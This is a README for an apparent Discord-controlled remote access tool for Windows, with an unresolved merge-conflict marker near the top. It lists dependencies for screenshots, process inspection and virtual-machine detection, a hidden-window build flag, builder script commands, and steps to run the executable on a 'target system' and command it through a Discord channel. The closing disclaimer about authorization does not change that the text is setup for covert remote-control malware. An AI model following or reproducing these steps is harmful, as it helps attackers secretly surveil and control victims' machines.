## Setup

1. Clone the repository
2. Install the required Go dependencies:
<<<<<<< HEAD
=======
   ```
   go get github.com/bwmarrin/discordgo
   go get github.com/kbinani/screenshot
   go get github.com/shirou/gopsutil/cpu
   go get modernc.org/sqlite
   go get golang.org/x/sys/windows
   go get github.com/shirou/gopsutil/process
   go get github.com/reujab/wallpaper
   go get github.com/TheTitanrain/w32
   go get github.com/ShellCode33/VM-Detection/vmdetect
   ```
3. Create a Discord bot and obtain the bot token
4. Replace `BOT_TOKEN` and `CHANNEL_ID` in `main.go` with your Discord bot token and channel ID
5. Build the project:
   ```
   go build -ldflags -H=windowsgui
   ```
6. Use the builder.py Python script to automate the above.
   ```bash
   python3 builder.py

   [+] > use discord
   [+] > set guild-id <Your Discord Channel-ID>
   [+] > set bot-token <Your Discord Bot Token>
   [+] > show
   [+] > build
   ```

## Usage

1. Run the compiled executable on the target system
2. The bot will connect to the specified Discord channel
3. Use the Discord interface to send commands and interact with the target system

## Security Considerations

- This tool can be detected by antivirus software and should not be used for malicious purposes
- Always ensure you have proper authorization before using this tool on any system
- The bot token and channel ID are hardcoded in the binary, which poses a security risk if the binary is obtained by unauthorized parties
